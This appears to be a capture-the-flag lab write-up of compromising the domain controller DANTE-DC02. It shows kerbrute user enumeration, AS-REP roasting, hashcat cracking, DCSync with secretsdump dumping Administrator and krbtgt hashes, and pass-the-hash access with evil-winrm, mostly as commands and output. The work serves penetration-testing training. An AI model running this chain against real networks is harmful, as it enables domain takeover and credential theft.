# 172.16.2.5 - DANTE-DC02 Pwn3d!

nmap -sCV 172.16.2.5
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-08-13 15:24 EDT
Nmap scan report for 172.16.2.5
Host is up (0.017s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-13 19:25:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DANTE-DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-13T19:25:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

cme smb 172.16.2.5 -u '' -p ''
SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.2.5      445    DANTE-DC02       [+] DANTE.ADMIN\:

cred spray did not work

./kerbrute userenum -d DANTE.ADMIN --dc 172.16.2.5 users.txt -o hits.txt

```
__             __               __
```

/ /_____  ***/ /  _______  / /**
/ /// _ \/ / __ \/ / / / / __/ _ \
/ ,< /  __/ /  / // / /  / // / //  __/
//||\//  /.//   \,_/\/\*__/

Version: v1.0.3 (9dad6e1) - 08/13/26 - Ronnie Flathers @ropnop

2026/08/13 16:13:11 >  Using KDC(s):
2026/08/13 16:13:11 >  	172.16.2.5:88

2026/08/13 16:13:11 >  [+] VALID USERNAME:	 jbercov@DANTE.ADMIN

impacket-GetNPUsers DANTE.ADMIN/ -usersfile users_clean.txt -dc-ip 172.16.2.5 -no-pass -format hashcat -outputfile asrep_hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$jbercov@DANTE.ADMIN:ff0886151ce47543a6d0986f44258639$cff6c6bb2e0cc7071a8369bc4749153713c2d59930412c447a25e2762ae10c7d6f2e74ecbebd972b2d74d49a7196231c90635b79f0eb4bd7178e9b982ff00b77fc0ae164c887ea72cfbb07fb230f1c285e2f2fdcc9e6d96de6651803c763e9f4e2dafcbc945e127afa6abedfff9bf5430ee20a7c0aef07a779bf3938c0e0d27b90c17673abef143e4352705ae4c6b6894a5742e81e3ae158a4ab4138041a2ebd8962fd9293f23e45a6ec05af29a6661265fc3f80b0a004566474bb0e720933a537247e919b5a5b7e2cee90e2e7dcd6e9f54b92fd99c4d60b5e83eb324d3afdb50867faa75f829a41589e

sudo hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt.gz 

jbercov:myspace7

python3 [bloodhound.py](http://bloodhound.py/) -u jbercov -p myspace7 -d DANTE.ADMIN --zip -c all -ns 172.16.2.5

![image.png](172%2016%202%205%20-%20DANTE-DC02%20Pwn3d%21/image.png)

jbercov can DCSync

impacket-secretsdump jbercov:myspace7@172.16.2.5
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:8039e3e3d5e34884add5da83947f27cd:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
DANTE-DC02$:aes256-cts-hmac-sha1-96:e4bd54c9fe23156728ce8d4c177c661f1ed35d99946e010889bf108be6405bfa
DANTE-DC02$:aes128-cts-hmac-sha1-96:5202198824e5a848d72e2f4626bddb27
DANTE-DC02$:des-cbc-md5:a18a34d357022915

evil-winrm -i 172.16.2.5 -u Administrator -H 4c827b7074e99eefd49d05872185f7f8

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir

```
Directory: C:\Users\Administrator\Documents
```

Mode                LastWriteTime         Length Name

---

- a---- 7/14/2020 1:01 PM 50 Jenkins.bat

*Evil-WinRM* PS C:\Users\Administrator\Documents> download Jenkins.bat

Info: Download successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

```
Directory: C:\Users\Administrator\Desktop
```

Mode                LastWriteTime         Length Name

---

- a---- 1/8/2021 1:59 PM 20 flag.txt
-a---- 12/4/2020 1:15 AM 170 Note.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
DANTE{DC_or_Marvel?}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat Note.txt
You were supposed to find this subnet via enumerating the browser history files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.

*Evil-WinRM* PS C:\Users\jbercov\Desktop> ls

```
Directory: C:\Users\jbercov\Desktop
```

Mode                LastWriteTime         Length Name

---

- a---- 1/8/2021 2:01 PM 35 flag.txt

*Evil-WinRM* PS C:\Users\jbercov\Desktop> cat flag.txt
DANTE{Im_too_hot_Im_K3rb3r045TinG!}

cat Jenkins.bat
net user Admin_129834765 SamsungOctober102030 /add

*Evil-WinRM* PS C:\Users\jbercov> ipconfig /all

Windows IP Configuration

Host Name . . . . . . . . . . . . : DANTE-DC02
Primary Dns Suffix  . . . . . . . : DANTE.ADMIN
Node Type . . . . . . . . . . . . : Hybrid
IP Routing Enabled. . . . . . . . : No
WINS Proxy Enabled. . . . . . . . : No
DNS Suffix Search List. . . . . . : DANTE.ADMIN

Ethernet adapter Ethernet0 2:

Connection-specific DNS Suffix  . :
Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
Physical Address. . . . . . . . . : A2-DE-AD-7F-91-B0
DHCP Enabled. . . . . . . . . . . : No
Autoconfiguration Enabled . . . . : Yes
Link-local IPv6 Address . . . . . : fe80::55b2:cb49:acc3:b36a%16(Preferred)
IPv4 Address. . . . . . . . . . . : 172.16.2.5(Preferred)
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 172.16.2.1
DHCPv6 IAID . . . . . . . . . . . : 302010454
DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-0F-C7-6E-00-50-56-B9-87-3B
DNS Servers . . . . . . . . . . . : 127.0.0.1
NetBIOS over Tcpip. . . . . . . . : Enabled

cat Note.txt
You were supposed to find this subnet via enumerating the browser history files on DC01.

172.16.1.10 can also pivot to this box, it may be a bit more stable than DC01.